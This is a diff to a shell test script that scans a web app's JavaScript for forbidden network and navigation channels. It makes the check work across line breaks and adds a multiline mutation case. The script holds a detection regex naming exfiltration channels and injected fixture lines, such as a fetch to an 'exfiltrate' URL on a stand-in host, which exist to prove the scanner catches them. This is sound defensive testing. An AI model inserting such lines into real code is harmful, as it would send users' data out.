@@ -476,7 +476,16 @@ echo "static scan (app.js): forbidden channels and wording"
 # `.location` property).
 FORBIDDEN_JS_RE='fetch\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource|ServiceWorker|serviceWorker|new[[:space:]]+Worker|importScripts|import\(|window\.open|window\.location[[:space:]]*=[^=]|location\.href|location\.assign|location\.replace|document\.location|(^|[^.[:alnum:]_])location[[:space:]]*=[^=]|\.innerHTML[[:space:]]*='
 
-check_forbidden_js() { ! grep -nE "$FORBIDDEN_JS_RE" "$1" >/dev/null; }
+# Flattens the whole file to one line (newlines -> spaces) before matching,
+# so a statement split across lines — e.g.
+#   window.location =
+#     "https://example.invalid/";
+# — is still caught. A plain line-by-line `grep` requires the post-`=`
+# character on the SAME line as the `=`, which a reformatted (but still
+# executing) assignment can trivially cross (Codex round-3 finding). This
+# also hardens every other alternative in FORBIDDEN_JS_RE against the same
+# blind spot, not only the location ones.
+check_forbidden_js() { ! tr '\n' ' ' < "$1" | grep -qE "$FORBIDDEN_JS_RE"; }
 
 check_forbidden_js "$APP_JS" && ok "no forbidden network/navigation/innerHTML token in app.js" || bad "a forbidden network/navigation/innerHTML token was found in app.js"
 
@@ -516,6 +525,7 @@ check_forbidden_js "$APP_JS" && ok "the real app.js has no forbidden channel to 
 NET_MUTATIONS=(
   'fetch("https://example.invalid/exfiltrate");'
   'window.location = "https://example.invalid/";'
+  $'window.location =\n  "https://example.invalid/";'
   'new WebSocket("wss://example.invalid");'
   'window.open("https://example.invalid/");'
 )
@@ -526,7 +536,7 @@ for mutation in "${NET_MUTATIONS[@]}"; do
   printf '\n%s\n' "$mutation" >> "$mutant_file"
   check_forbidden_js "$mutant_file" && NET_ALL_CAUGHT=0
 done
-[[ "$NET_ALL_CAUGHT" -eq 1 ]] && ok "mutation witness (network/external-navigation channel): fetch, window.location assignment, WebSocket, and window.open are each individually detected" || bad "mutation witness (network/external-navigation channel) missed at least one injected channel"
+[[ "$NET_ALL_CAUGHT" -eq 1 ]] && ok "mutation witness (network/external-navigation channel): fetch, single-line and multiline window.location assignment, WebSocket, and window.open are each individually detected" || bad "mutation witness (network/external-navigation channel) missed at least one injected channel"
 
 # D2 — false-positive control: ordinary, non-navigating code that merely
 # mentions "location" as a property name, a read, or a comparison must NOT
